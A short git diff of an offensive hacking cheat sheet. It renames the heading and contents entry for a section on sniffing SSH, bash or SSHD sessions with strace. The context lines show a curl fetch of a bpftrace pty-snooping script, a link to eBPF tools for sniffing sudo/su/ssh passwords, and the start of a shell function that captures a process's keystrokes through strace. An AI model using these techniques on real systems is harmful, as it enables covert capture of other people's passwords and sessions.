@@ -95,7 +95,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Sniff a user's SHELL session](#session-sniffing)
    2. [Sniff all SHELL sessions with dtrace](#dtrace)
    2. [Sniff all SHELL sessions with eBPF](#bpf)
-   1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
+   1. [Sniff a user's SSH or SSHD session with strace](#ssh-sniffing-strace)
    1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
    1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
    1. [Hijack / Take-over a running SSH session](#hijack)
@@ -2087,7 +2087,7 @@ curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/pty
 Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://github.com/hackerschoice/bpfhacks).
 
 <a id="ssh-sniffing-strace"></a>
-**10.iv Sniff a user's outgoing SSH session or bash with strace**
+**10.iv Sniff a user's SSH, bash or SSHD session with strace**
 ```sh
 tit() {
 	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
